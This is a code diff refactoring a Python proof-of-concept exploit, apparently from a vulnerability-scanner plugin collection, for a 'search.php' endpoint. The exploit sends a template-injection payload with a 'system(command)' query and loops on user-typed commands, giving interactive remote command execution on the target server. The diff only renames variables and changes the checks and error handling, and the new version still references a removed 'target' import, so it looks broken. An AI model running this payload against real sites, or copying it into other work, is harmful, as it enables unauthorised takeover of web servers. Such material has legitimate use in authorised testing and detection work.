@@ -1,20 +1,18 @@
-from lib.core.data import target
+from plugin.component.check import url_check
 import requests
 import re
 
 
-def poc():
+def poc(url):
     try:
-        if not target.url.endswith("search.php"):
-            print("[*] Please make sure the url end with 'search.php'")
-            exit()
+        url_check(url,"search.php")
 
         while 1:
             try:
                 command = raw_input("[*] input the command:")
                 if command != "exit":
                     url = target.url + "?system(%s)" % command
-                    postData = {
+                    post_data = {
                         "searchtype": "5",
                         "searchword": "{if{searchpage:year}",
                         "year": ":as{searchpage:area}}",
@@ -25,12 +23,12 @@ def poc():
                         "ver": "[QUERY_STRING]));/*"
                     }
 
-                    r = requests.post(url, data=postData)
+                    r = requests.post(url, data=post_data)
                     print(r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding))
                 else:
                     break
             except EOFError as e:
                 print("[*] type 'exit' to quit")
                 pass
-    except KeyError as e:
+    except Exception:
         print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
